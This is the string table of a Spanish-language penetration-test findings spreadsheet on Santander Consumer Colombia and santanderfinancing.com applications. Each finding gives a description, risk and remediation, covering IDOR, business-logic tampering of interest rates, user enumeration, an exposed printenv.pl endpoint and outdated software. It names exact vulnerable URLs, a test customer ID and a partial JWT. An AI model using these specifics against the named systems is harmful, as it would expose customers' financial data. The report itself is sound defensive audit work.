    <t>Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar los datos del perfil, permitiendo a cualquier usuario consultar los datos de cualquier cliente,  Conociendo únicamente la cédula.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene
privilegios de acceso a la información consultada.
En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el
aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a
consultar, crear, modificar, o borrar.
Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie
a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el
usuario antes de su envío al servidor</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo direct+AD356amente modificando el valor de un  parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación</t>
  </si>
  <si>
    <t>1° Fecha 25/06/2025</t>
  </si>
  <si>
    <t>SC-25-CNMPO-002-AP-002</t>
  </si>
  <si>
    <t>Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar el certificado de Deuda del año 2024. Para evidenciar la vulnerabilidad, primero se inicia sesión con el usuario “1077034607”, adquiriendo su token JWT (el cual acaba en  Nq40UiUZ6Zw) y accediendo al informe de certificación de deuda del año 2024</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene
privilegios de acceso a la información consultada.
En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el
aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a
consultar, crear, modificar, o borrar.
Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie
a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el
usuario antes de su envío al servidor.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un  parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación</t>
  </si>
  <si>
    <t>SC-25-CNMPO-002-AP-003</t>
  </si>
  <si>
    <t>Durante el ejercicio de Hacking ético sobre la aplicación analizada, se ha identificado la ausencia de control de privilegios de un usuario a la hora de consultar los datos del perfil, permitiendo a cualquier usuario consultar los datos de cualquier cliente, conociendo únicamente la cédula</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para
acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a consultar, crear, modificar, o borrar. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto en este caso, la cédula de cualquier cliente. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a
la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación.</t>
  </si>
  <si>
    <t>MAN-686bb23170644f0580904fb8</t>
  </si>
  <si>
    <t xml:space="preserve">SCO-25-CNMPA-007-VE-001 </t>
  </si>
  <si>
    <t>https://www.santanderfinancing.com/</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha observado que es posible degradar el rendimiento de la aplicación y el servidor remoto que la sustenta. Siendo posiblemente vulnerable a una denegación de servicio de la infraestructura e impidiendo que la aplicación pueda prestar servicio a los usuarios legítimos de la aplicación.
The Apache
HTTP Server 1.x
and 2.x
CVE-2007-
6750
</t>
  </si>
  <si>
    <t>Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas
para la versión utilizada, se recomienda instalar los parches de seguridad específicos que pongan
en riesgo la seguridad del sistema.</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Sin Definir</t>
  </si>
  <si>
    <t>MAN-686bb26370644f0580904ff1</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-007-CO-002</t>
  </si>
  <si>
    <t>Servicio expuesto no recomendado (SMBv2 exploit)</t>
  </si>
  <si>
    <t>SMBv2 exploit es una vulnerabilidad crítica en el controlador del kernel de Windows (srv2.sys) que afecta la implementación del protocolo 445. Fue descubierta en sistemas Windows Vista y Windows Server 2008 (sin R2). El fallo ocurre cuando un atacante remoto no autenticado envía un paquete SMBv2 especialmente
manipulado al puerto 445/TCP, lo que provoca un desbordamiento de búfer que permite la ejecución remota de código (RCE) en modo kernel.</t>
  </si>
  <si>
    <t>1- Aplicar el parche oficial de seguridad publicado por Microsoft en el boletín MS09-050, el cual
corrige específicamente esta vulnerabilidad.
• Referencia: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2009-3103
2- Actualizar el sistema operativo a una versión más reciente y soportada, como Windows 10,
Windows Server 2016 o superior, ya que las versiones vulnerables (Windows Vista y Server 2008 sin
R2) han alcanzado su fin de soporte.
3- Restringir el acceso al puerto 445/TCP mediante políticas de firewall. Este puerto solo debe
estar accesible desde redes internas de confianza.
• Asegurarse de bloquear completamente el acceso externo al servicio SMB desde
Internet.
4- Deshabilitar el protocolo SMBv2 si no es necesario, como medida temporal de mitigación.
5- Monitorizar el tráfico de red en busca de actividad anómala relacionada con SMB,
especialmente escaneos o paquetes sospechosos dirigidos al puerto 445.
6- Segmentar la red interna y aplicar el principio de mínimo privilegio, para reducir el riesgo de
movimientos laterales en caso de compromiso de un equipo.</t>
  </si>
  <si>
    <t>La vulnerabilidad CVE-2009-3103 permite a un atacante remoto, sin necesidad de autenticación, ejecutar código arbitrario en el sistema afectado mediante el envío de paquetes SMBv2 especialmente diseñados al puerto TCP 445. Este tipo de vulnerabilidad, catalogada como ejecución remota de código (RCE), afecta directamente al núcleo del sistema operativo (modo kernel), lo que le otorga al atacante control
total sobre el equipo comprometido.</t>
  </si>
  <si>
    <t xml:space="preserve">SCO-25-CNMPA-007-CO-005 </t>
  </si>
  <si>
    <t>Enumeración de directorios (wp-content y wp-includes)</t>
  </si>
  <si>
    <t>https://www.santanderfinancing.com/wp-content/
https://www.santanderfinancing.com/wp-includes/</t>
  </si>
  <si>
    <t>Se recomienda evitar la lista de directorios por motivos de seguridad.
-Nginx
Dependiendo de la versión de Nginx, es necesario modificar el archivo nginx.conf. Una
configuración segura para el directorio solicitado debería ser similar a la siguiente:
ubicación /{TU DIRECTORIO} {
 autoindexación desactivada;
}
Luego, configure el servidor web para no permitir solicitudes de listado de directorios.
También se recomienda asegurarse de que se hayan aplicado los últimos parches de seguridad al
servidor web y que se esté utilizando la versión estable actual del software.
Para obtener más información, consulte la siguiente URL:
http://nginx.org/en/docs/http/ngx_http_autoindex_module.html
-Apache
Dependiendo de la versión de Apache, es necesario modificar el archivo httpd.conf o .htaccess:
&lt;Directorio /var/www/html&gt;
 Opciones -Índices
&lt;/Directorio&gt;</t>
  </si>
  <si>
    <t>Dependiendo del tipo de información que contengan los ficheros incluídos en los directorios podría tener un mayor o menor en el impacto de la confidencialidad de los datos. Un atacante podría utilizar la información encontrada para realizar posteriormente un ataque dirigido.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-007-CO-006</t>
  </si>
  <si>
    <t>Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones
necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un
requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).
También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebido
de terceros</t>
  </si>
  <si>
    <t>Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure
un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin
permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-007-CO-007</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting.
Esta política es la única forma de proteger las imágenes de ataques Spectre.</t>
  </si>
  <si>
    <t>Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué
orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo
contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a
entornos no confiables.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-007-CO-008</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t xml:space="preserve">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 </t>
  </si>
  <si>
    <t>QA-WAS-6e89f0d2-3b83-4a0f-8a2e-a932cd1bcae0</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/cos-i18n/static-1.53/squidGuard.conf.template</t>
  </si>
  <si>
    <t>QA-WAS-d1208c14-c2e5-4f0d-a452-91016e59eec5</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/HubspotToolsMenu/squidGuard.conf.template</t>
  </si>
  <si>
    <t>QA-WAS-c09e0c4d-b0dc-47c2-a35e-10d870ad296c</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/squidGuard.conf.template</t>
  </si>
  <si>
    <t>QA-WAS-88e6a6e7-965f-49a4-a0a3-1261d76cd21b</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/squidGuard.conf</t>
  </si>
  <si>
    <t>QA-WAS-effe1295-5afc-42b4-b337-1789dfd9f9b4</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/squidGuard.conf.template</t>
  </si>
  <si>
    <t xml:space="preserve">prospera </t>
  </si>
  <si>
    <t>Martha Sanchez Sanchez</t>
  </si>
  <si>
    <t>QA-WAS-cf7c0b7f-a040-4bf9-8f79-804df5af6167</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/scriptloader/squidGuard.conf.template</t>
  </si>
  <si>
    <t>QA-WAS-63a0cc86-8b92-41b5-bd16-3ecf11e3951e</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/</t>
  </si>
  <si>
    <t>QA-WAS-c6c55687-a92d-46dd-98d5-b2cc5b0cd4fb</t>
  </si>
  <si>
    <t>QA-WAS-acdfaa8f-9a8b-4387-8e78-9123f7015196</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/uploads/2025/07/</t>
  </si>
  <si>
    <t>QA-WAS-ddd76362-c445-48cc-96a0-22297f7d3868</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/cos-i18n/static-1.53/squidGuard.conf</t>
  </si>
  <si>
    <t>QA-WAS-255a5e01-2c22-47fc-9253-318974a713cc</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/hsstatic/squidGuard.conf</t>
  </si>
  <si>
    <t>QA-WAS-835d5b21-4b3d-40f1-93ea-e15aafce6b9e</t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/hs/scriptloader/squidGuard.conf</t>
  </si>
  <si>
    <t>QA-WAS-d3aa81a2-fe18-4d64-abcf-11eee0519096</t>
  </si>
  <si>
    <t>QA-WAS-f74a856d-773e-43e5-8782-b805c9eeec64</t>
  </si>
  <si>
    <t>QA-WAS-27223593-7079-4e74-9641-b96f596df73b</t>
  </si>
  <si>
    <t>Proyecto Portal Consumer</t>
  </si>
  <si>
    <t>CBD-25-CNMPO-008-AP-001</t>
  </si>
  <si>
    <t>Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan  información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo,  direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden  Proporcionar información interna de la organización, tales  como nombres de empleados, códigos de usuario o versiones de software.</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos 
generados y/o publicados en la aplicación. De manera adicional se puede implementar un 
procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los 
mismos no contengan información sensible de la organización en sus metadatos</t>
  </si>
  <si>
    <t>CBD-25-CNMPO-008-AP-002</t>
  </si>
  <si>
    <t>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Esta versión, adicionalmente, tiene vulnerabilidades conocidas: CVE-2023-44487</t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite 
a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así 
como generar ataques más elaborados contra la plataforma</t>
  </si>
  <si>
    <t>MAN-68e67253c27f315eb11ba7f2</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN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DETALLE   SCO-25-CNMPA-008-CO-002:   A través del endpoint, identificado https://santanderfinancing.com/cgi-bin/printenv.pl es posible enumerar información sobre el equipo, el servidor y la aplicación del backend. Se muestran a continuación las evidencias:      Figura 1 - Listado de variables de entorno del servidor remoto (1/2)      Figura 2 - Listado de variables de entorno del servidor remoto (2/2)   Se enumeran dos direcciones IP’s que deben pertenecer al servicio web tras el WAF o el balanceador ya que no coincide con la IP de resolución del nombre. Se ha intentado acceder y analizar estas IP’s pero parece que el tráfico externo está bloqueado correctamente.   RIESGO   Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN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t>
  </si>
  <si>
    <t>MAN-68e67203c27f315eb11ba7f1</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   Durante la realización de las pruebas se ha podido comprobar que el activo afectado hace uso de cierta versión de software que presenta vulnerabilidades conocidas y divulgadas públicamente.   DETALLE   SCO-25-CNMPA-008-VE-001:   Se ha detectado que el activo afectado localizado en https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/styles/gdpr-main-nf.css?ver=4.16.1 posee una versión de gdpr-cookie-compliance con vulnerabilidades públicas asociadas.   A continuación se muestra como el software vulnerable se encuentra en uso.                 Los detalles de la vulnerabilidad pública de esta versión del software se pueden consultar en los siguientes enlaces:    https://wpscan.com/vulnerability/c30b9631-2024-4081-9cc5-8294a77c5ebb/   - El CVE asociado es CVE-2025-1621 con una criticidad baja que permite implementar un XSS de forma postautenticada con permisos elevados.      https://httpd.apache.org/security/vulnerabilities_24.html   https://wpscan.com/vulnerability/c30b9631-2024-4081-9cc5-8294a77c5ebb/       RIESGO   El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante vulnerabilidades conocidas, lo cual puede poner en riesgo al activo afectado.</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   Se recomienda actualizar la versión del plugin gdpr-cookie-compliance y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-011-VE-001</t>
  </si>
  <si>
    <t>bpm.santanderconsumer.co/OriginacionPROD/</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha comprobado que la aplicación hace uso de librerías de terceros que tienen vulnerabilidades públicas asociadas.</t>
  </si>
  <si>
    <t>El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante 
vulnerabilidades conocidas poniendo en riesgo el activo afectado.</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión de jQuery y DOMPurify y establecer una política de 
actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. 
La últimas versiónes de jQuery y DOMPurify puede ser descargadas desde la siguientes direcciónes
URL: 
• jQuery: https://jquery.com/download
• DOMPurify: https://github.com/cure53/DOMPurif</t>
  </si>
  <si>
    <t>Alexander Parra</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-011-AP-002</t>
  </si>
  <si>
    <t>nteracción con servicios externos (DNS)</t>
  </si>
  <si>
    <t>El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante.Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante.</t>
  </si>
  <si>
    <t>Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no 
se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor 
afectado para que utilice un servidor DNS interno o de la DMZ.</t>
  </si>
  <si>
    <t>Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició 
la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, 
un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del 
mismo. 
Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como 
proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos 
vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta y se mostraría 
la dirección IP del servidor afectado como originaria del ataque.</t>
  </si>
  <si>
    <t>MAN-68f73b944f1323618c186787</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-012-AP-001</t>
  </si>
  <si>
    <t>El identificador de sesión almacenado en la cookie es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript o ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, si existen en el aplicativo vulnerabilidades de tipo 
Cross Site Scripting, un atacante podría usurpar el identificador de sesión del usuario con la finalidad  de impersonar al usuario en el aplicativo.</t>
  </si>
  <si>
    <t>El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un 
atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos 
dentro de la aplicación.</t>
  </si>
  <si>
    <t>Te recomienda proteger los identificadores de sesión, almacenados a través de las cookies, 
mediante el atributo de seguridad "HttpOnly". De esta manera se evita que se pueda acceder al 
identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). 
La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-010-AP-001</t>
  </si>
  <si>
    <t>La vulnerabilidad asociada al método TRACE sucede cuando un servidor web permite su utilización,  lo que puede ser explotado por atacantes para llevar a cabo ataques de tipo Cross Site Tracing  (XST). Este método permite que un atacante envíe solicitudes a un servidor y obtenga información sensible, como cookies de sesión, mediante el eco de las solicitudes HTTP. La disponibilidad del método TRACE puede comprometer la seguridad de las aplicaciones web, exponiendo a la organización a riesgos de suplantación de identidad y acceso no autorizado a datos confidenciales. Se recomienda deshabilitar esta función en los servidores web con el fin de mitigar el riesgo 
asociado.</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar el método TRACE en todos los servidores web para prevenir la 
explotación de esta vulnerabilidad y proteger la información sensible de posibles ataques, como el 
Cross Site Tracing (XST).</t>
  </si>
  <si>
    <t>El riesgo asociado al método TRACE radica en la potencial explotación por parte de atacantes, 
quienes pueden acceder a información sensible y comprometer la seguridad de las aplicaciones web 
a través de ataques de tipo Cross Site Tracing.</t>
  </si>
  <si>
    <t>MAN-68f1f46b4f1323618c17c18a</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-001</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com
/MazdaDirectCredit/send-code-username</t>
  </si>
  <si>
    <t>La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica  de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito.
Las vulnerabilidades relacionadas con la validación de lógica de negocio son únicas ya que son específicas de cada aplicación debido a que tratan de modificar los datos lógicos que la aplicación acepta para su correcto funcionamiento.En este caso particular se ha conseguido modificar el rate de intereses en el documento de solicitud del crédito</t>
  </si>
  <si>
    <t>Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos 
introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación 
y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación</t>
  </si>
  <si>
    <t>Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o 
forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas 
restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos 
por la misma.</t>
  </si>
  <si>
    <t>MAN-68f1f41b4f1323618c17c189</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-002</t>
  </si>
  <si>
    <t>Durante el análisis de seguridad se identificó una vulnerabilidad que permite la enumeración de  usuarios en la funcionalidad de recuperación de contraseña. El sistema presenta mensajes o  comportamientos diferenciados al ingresar un usuario o correo existente frente a uno inexistente, permitiendo a un atacante determinar qué cuentas están registradas en la aplicación. Esta exposición de información puede facilitar ataques posteriores de fuerza bruta o ingeniería social al revelar usuarios válidos del sistema.</t>
  </si>
  <si>
    <t>Se recomienda que el aplicativo no permita proporcionar un listado de usuarios presentes en el 
sistema a roles que no sean administrativos. Así mismo, se recomienda que el mecanismo de 
autenticación no proporcione evidencias que permitan discernir si el usuario introducido está dado 
de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de 
respuesta de la aplicación. Siendo un mensaje genérico de acceso incorrecto la mejor opción en 
estos casos.</t>
  </si>
  <si>
    <t>Esta vulnerabilidad podría ser utilizada por un atacante para intentar obtener un listado de los 
usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar 
ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de 
contraseñas, ataques de phishing, ataques de fuerza bruta o "password spraying" sobre las 
contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna 
cuenta de usuario o administrador.</t>
  </si>
  <si>
    <t>MAN-68f212e24f1323618c17c18c</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-003</t>
  </si>
  <si>
    <t>Se ha identificado que JasperReports en versiones anteriores a la 8.0.4 contiene una vulnerabilidad  pública con el CVE-2024-3326 de carácter crítico que permite el compromiso del equipo. No se ha encontrado exploit’s públicos ni la forma de explotarlo, pero partiendo de la criticidad de la misma debe tenerse en cuenta y actualizar el software utilizado.</t>
  </si>
  <si>
    <t>Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o 
infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas 
para la versión utilizada se recomienda instalar los parches de seguridad específicos que pongan en 
riesgo la seguridad del sistema.</t>
  </si>
  <si>
    <t>Un atacante podría identificar el software utilizado por la aplicación con la finalidad de explotar 
alguna vulnerabilidad conocida para tomar el control del sistema.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-004</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com
/MazdaDirectCredit/</t>
  </si>
  <si>
    <t>La cabecera "CSP" (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página.</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una 
vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t xml:space="preserve">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"Content-Security_x0002_Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se 
trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
Content-Security-Policy: default-src 'self' *.trusted.com </t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-005</t>
  </si>
  <si>
    <t>La aplicación no presenta ningún tipo de protección contra ataques de automatización de peticiones  HTTP. De esta manera, un atacante podría automatizar la realización de numerosas peticiones sobre algunos parámetros de entrada de la aplicación con el objetivo de averiguar, mediante fuerza bruta, información de la misma como pudieran ser, nombres de usuario, credenciales, identificadores de usuario, etc.</t>
  </si>
  <si>
    <t>Se recomienda implementar un sistema que impida la automatización de peticiones como, por 
ejemplo, un sistema de bloqueo por dirección IP ante un número de peticiones elevado en un 
tiempo definido o un sistema tipo CAPTCHA, que se le presente al usuario después de un número 
de intentos de averiguación del dato. Este umbral ha de ser ajustado dependiendo del tipo de 
aplicación y la lógica de la misma, por ejemplo, mostrar el sistema CAPTCHA cuando se exceda de 
5 intentos de averiguación en menos de 1 minuto.</t>
  </si>
  <si>
    <t>De no bloquear los ataques automatizados de fuerza bruta, un atacante podría llevar a cabo con 
éxito la obtención de nombres de usuario de la aplicación, correos electrónicos válidos e incluso 
averiguar credenciales de un usuario legítimo de la aplicación.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-008-AP-006</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com
/MazdaDirectCredit/login</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework de  programación utilizada para sustentar a la propia aplicación, así como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t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al 
software/framework y versión utilizada para desarrollar la propia aplicación. Para ello es necesario 
eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen 
este tipo de información.</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a 
un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como 
generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-017-AP-001</t>
  </si>
  <si>
    <t>(Potencial) Referencias Inseguras a Objetos de manera Directa (IDOR)</t>
  </si>
  <si>
    <t>El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible. 
En este caso particular, un usuario puede acceder de manera directa a los datos y contenido de tickets creados a través de la funcionalidad API modificando el identificador 
https://api.hubapi.com/crm/v3/objects/tickets/{id_ticket}?archived=false</t>
  </si>
  <si>
    <t xml:space="preserve">Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo 
directamente modificando el valor de un parámetro utilizado para apuntar directamente a un 
objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros 
usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de 
manera previa. </t>
  </si>
  <si>
    <t>MAN-690b1a37da6d35412ab651a2</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-017-AP-002</t>
  </si>
  <si>
    <t>(Potencial) Cross Site Scripting Almacenado</t>
  </si>
  <si>
    <t>https://api.hubapi.com/crm/v3/objetcs/tickets</t>
  </si>
  <si>
    <t>Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría 
almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes 
acciones:
• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario 
que, normalmente, se encuentra almacenado a través de una cookie.
• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible.
• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar 
vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. 
Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el 
sistema de la víctima.
• Ejecución de acciones de forma "transparente" para el usuario: Interactuar con la aplicación y 
realizar acciones sin el conocimiento del usuario.</t>
  </si>
  <si>
    <t>Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría 
almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes 
acciones:
• Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario 
que, normalmente, se encuentra almacenado a través de una cookie.
• Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible.
• Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar 
vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. 
Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el 
sistema de la víctima.</t>
  </si>
  <si>
    <t>Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por 
los usuarios, de forma que se valide adecuadamente la información transmitida a través de los 
mismos. 
Existen dos estrategias generales para implantar este filtro: 
•Filtrado de lista blanca: Se valida la información recibida en función de la información esperada. 
•Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades 
HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código 
JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”. 
De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas 
ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga 
una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. 
